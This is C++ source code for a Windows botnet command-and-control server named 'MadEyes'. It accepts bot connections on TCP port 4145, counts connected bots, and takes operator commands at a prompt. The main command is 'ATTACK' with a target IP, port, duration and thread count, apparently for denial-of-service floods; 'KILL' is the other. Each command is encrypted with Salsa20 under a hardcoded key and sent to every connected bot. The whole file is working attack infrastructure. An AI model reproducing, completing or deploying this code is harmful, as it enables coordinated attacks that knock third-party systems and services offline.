#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <WinSock2.h>
#include <iostream>
#include <windows.h>
#include <vector>
#include <thread>
#include <string>
#include <sstream>
#include "salsa20.h"

enum CommandType
{
	Attack = 1,
	Kill = 2,
	wait = 3
};

struct Command // ATTACK <ip> <port> <duration> <thread>
{
	DWORD command_type;
	CHAR first_command[64];
	DWORD second_command;
	DWORD third_command;
	DWORD fourth_command;
};

struct Bot
{
	SOCKET bSocket;
	Command command;
};

int bot_count;
std::vector<Bot*> client;

void Listener();
DWORD WINAPI BotRunning(LPVOID lpVoid);
int IsConnected(SOCKET* socket);
std::vector<std::string> Split(std::string str, char delimiter);
void Title();

int main()
{
	std::thread listener(Listener);
	std::thread title(Title);
	while (true)
	{
		std::string input;
		std::cout << "MadEyes>";
		std::getline(std::cin, input);
		std::vector<std::string> split = Split(input, ' ');
		if (split.size() > 0)
		{
			if (!strcmp(split[0].c_str(), "ATTACK"))
			{
				if (split.size() != 5)
				{
					std::cout << "ATTACK <IP> <PORT> <DURATION> <THREAD> " << std::endl;
				}
				else
				{
					std::cout << "success" << std::endl;
					Command* cmd = (Command*)malloc(sizeof(Command));
					cmd->command_type = Attack;
					strcpy(cmd->first_command, split[1].c_str());
					cmd->second_command = atoi(split[2].c_str());
					cmd->third_command = atoi(split[3].c_str());
					cmd->fourth_command = atoi(split[4].c_str());
					for (int i = 0; i < client.size(); i++)
					{
						if (IsConnected(&(client[i]->bSocket)))
						{
							client[i]->command = *cmd;
						}
					}
				}
			}
			else if (!strcmp(split[0].c_str(), "KILL"))
			{
				if (split.size() != 2)
				{
					std::cout << "KILL <exitcode>" << std::endl;
				}
				else
				{
					Command* command = (Command*)malloc(sizeof(Command));
					command->command_type = Kill;
					command->second_command = atoi(split[1].c_str());
					for (int i = 0; i < client.size(); i++)
					{
						if (IsConnected(&(client[i]->bSocket)))
						{
							client[i]->command = *command;
						}
						else
						{
							client.erase(client.begin() + i);
						}
					}
				}
			}
			else
			{
				std::cout << "INVALID COMMAND" << std::endl;
			}
		}

	}
}

void Listener()
{
	DWORD PORT = 4145;

	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);

	SOCKET hListen;
	hListen = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	SOCKADDR_IN tListenAddr = {};
	tListenAddr.sin_family = AF_INET;
	tListenAddr.sin_port = htons(PORT);
	tListenAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	bind(hListen, (SOCKADDR*)&tListenAddr, sizeof(tListenAddr));
	listen(hListen, SOMAXCONN);

	SOCKADDR_IN tClntAddr = {};
	int iClntSize = sizeof(tClntAddr);
	while (true)
	{
		SOCKET hClient = INVALID_SOCKET;
		hClient = accept(hListen, (SOCKADDR*)&tClntAddr, &iClntSize);
		if (hClient != INVALID_SOCKET)
		{
			Command cmd;
			cmd.command_type = Attack;
			Bot* newBot = new Bot;
			newBot->bSocket = hClient;
			newBot->command = cmd;
			client.push_back(newBot);
			CreateThread(NULL, NULL, BotRunning, (LPVOID)newBot, NULL, NULL);
		}
		else if (hClient == INVALID_SOCKET)
		{
			continue;
		}
	}
}

DWORD WINAPI BotRunning(LPVOID lpVoid)
{
	uint8_t key[32] = { 34, 1,  72, 221, 123, 4, 95, 56, 62, 45, 19,
					 23, 27, 84, 24,  58,  6, 13, 62, 106, 74, 61,
					 53,  49,  58,  9, 5, 43, 11, 74, 45, 69 };
	Salsa20 crypter(key);
	bot_count++;
	((Bot*)lpVoid)->command.command_type = wait;
	while (true)
	{
		if (IsConnected(&((Bot*)lpVoid)->bSocket))
		{
			if (((Bot*)lpVoid)->command.command_type != wait)
			{
				crypter.Salsa20Do((uint8_t*)&((Bot*)lpVoid)->command, sizeof(Command), 78);
				int chk = send(((Bot*)lpVoid)->bSocket, (char*)&(((Bot*)lpVoid)->command), sizeof(Command), 0);
				if (chk != sizeof(Command))
				{
					break;
				}
				((Bot*)lpVoid)->command.command_type = wait;
			}
			
		}
		else
		{
			break;
		}
		Sleep(1000);
	}

	bot_count--;
	return 0;
}

int IsConnected(SOCKET* socket)
{
	int socket_status = send(*socket, "\x00\x01\x00\x01", 4, 0);
	if (socket_status == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
	{
		return 0;
	}
	return 1;

}

std::vector<std::string> Split(std::string str, char delimiter) {
	std::vector<std::string> internal;
	std::stringstream ss(str);
	std::string temp;

	while (std::getline(ss, temp, delimiter)) {
		internal.push_back(temp);
	}

	return internal;
}

void Title() {
	while (TRUE) {
		LPSTR title = (LPSTR)malloc(128 * sizeof(CHAR));
		sprintf(title, "MadEyes - [%d] Bots", bot_count);
		SetConsoleTitleA(title);
		free(title);
		Sleep(1000);
	}
}